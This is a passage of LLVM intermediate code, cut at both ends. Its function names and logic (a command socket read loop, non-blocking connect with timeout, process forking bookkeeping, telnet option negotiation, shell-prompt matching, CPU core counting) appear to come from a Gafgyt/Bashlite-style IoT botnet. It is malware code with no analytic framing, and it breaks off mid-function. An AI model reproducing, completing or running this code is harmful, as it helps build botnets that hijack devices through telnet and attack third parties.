declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

